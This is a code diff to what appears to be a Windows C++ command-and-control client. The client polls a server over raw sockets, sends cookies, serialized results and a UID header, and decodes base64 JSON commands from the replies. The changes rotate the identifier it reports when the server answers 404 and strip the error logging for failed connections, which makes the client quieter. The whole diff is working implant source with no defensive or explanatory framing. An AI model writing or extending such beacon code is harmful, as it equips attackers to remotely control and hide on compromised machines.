@@ -27,7 +27,9 @@ std::string cmdValue;
 std::string queryParams;
 std::string encodedParams;
 CommandQueue queue;
+std::string id_str;
 int key;
+bool http_404 = false;
 std::string cmdResponse;
 cmdStruct msg;
 using namespace std;
@@ -86,7 +88,17 @@ void to_json(json& j, const Queue& q) {
     j = json{{"Group", q.Group}, {"String", q.String}, {"Response", q.Response}};
 }
 
+
 std::string buildRequest(const std::string& path, const std::string& host, const std::string& cookies, CommandQueue& queue) {
+
+    if (http_404) { // server sent 404
+        id_str = misc::uid;
+        
+    } 
+    if (!http_404) {
+        id_str = misc::truncatedHash;
+    }
+
     if (!queue.empty()) {
         auto it = queue.begin(); 
 
@@ -122,7 +134,7 @@ std::string buildRequest(const std::string& path, const std::string& host, const
                                 + "Keep-Alive: timeout=15, max=1000\r\n" 
                                 + "Cookies: " + cookiesString + "\r\n"
                                 + "Serialized-Data: " + baseJ + "\r\n"
-                                + "UID: " + misc::uid + "\r\n"
+                                + "UID: " + id_str + "\r\n"
                                 + "\r\n";
         removeFromQueue(queue);
         return getRequest;
@@ -135,7 +147,7 @@ std::string buildRequest(const std::string& path, const std::string& host, const
                                 + "Connection: Keep-Alive\r\n"
                                 + "Keep-Alive: timeout=15, max=1000\r\n" 
                                 + "Cookies: " + cookiesString + "\r\n"
-                                + "UID: " + misc::uid + "\r\n"
+                                + "UID: " + id_str + "\r\n"
                                 + "\r\n";
         return getRequest;
     }
@@ -149,7 +161,6 @@ bool initialize_winsock() {
 SOCKET create_socket(const std::string& host, int port) {
     SOCKET ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     if (ConnectSocket == INVALID_SOCKET) {
-        std::cerr << "Error creating socket: " << WSAGetLastError() << std::endl;
         return INVALID_SOCKET;
     }
 
@@ -159,7 +170,6 @@ SOCKET create_socket(const std::string& host, int port) {
     serverAddr.sin_port = htons(port);
 
     if (connect(ConnectSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
-        std::cerr << "Error connecting to server: " << WSAGetLastError() << std::endl;
         closesocket(ConnectSocket);
         return INVALID_SOCKET;
     }
@@ -199,8 +209,15 @@ std::string http_get(const std::string& url) {
 
     std::vector<char> response_data = receive_data(ConnectSocket);
     std::string cmdValue = extractCMD(response_data);
-    req_body.clear();
 
+    std::string response_str(response_data.begin(), response_data.end());
+    if (response_str.find("404") != std::string::npos) {
+        http_404 = true; // Set the 404 flag to true
+    } else {
+        http_404 = false; // Set the 404 flag to false
+    }
+
+    req_body.clear();
     closesocket(ConnectSocket);
     WSACleanup();
     return ""; 
@@ -222,6 +239,7 @@ std::string extractCMD(const std::vector<char>& data) {
             }
         }
     }
+    
     base64_str.erase(std::remove_if(base64_str.begin(), base64_str.end(), ::isspace), base64_str.end());
     if (!base64_str.empty()) {
         try {
@@ -233,7 +251,7 @@ std::string extractCMD(const std::vector<char>& data) {
             // Extract and use value to declare a variable
             cmdGroup = jsonResponse["Group"];
             cmdString = jsonResponse["String"];
- 
+
         } catch (const std::invalid_argument& e) {
             std::cerr << "Error decoding base64: " << e.what() << std::endl;
             // Handle error
